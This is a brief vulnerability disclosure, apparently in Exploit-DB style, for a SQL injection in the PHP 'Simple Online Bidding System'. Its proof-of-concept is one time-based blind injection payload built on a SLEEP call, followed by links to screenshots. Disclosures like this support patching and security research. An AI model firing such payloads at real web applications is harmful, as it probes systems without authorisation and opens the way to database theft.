# Simple Online Bidding System

**Exploit Title: Simple Online Bidding System SQL** Injection

**Date**: 4/08/2023

**Exploit Author:** y3thu

**Vendor Homepage:** [https://www.sourcecodester.com/users/tips23](https://www.sourcecodester.com/users/tips23)

**Software Link:** [https://www.sourcecodester.com/php/14558/simple-online-bidding-system-using-phpmysqli-source-code.html](https://www.sourcecodester.com/php/14558/simple-online-bidding-system-using-phpmysqli-source-code.html)

**Attack Vector:** WEB, Network

**Testeted on:** Kali Linux

**POC**

- **payload:**   AND (SELECT 5294 FROM (SELECT(SLEEP(5)))bgxK)
    
    ![Untitled](Simple%20Online%20Bidding%20System%20da2e9c6864d742d182100671c9d5abed/Untitled.png)
    
    ![Untitled](Simple%20Online%20Bidding%20System%20da2e9c6864d742d182100671c9d5abed/Untitled%201.png)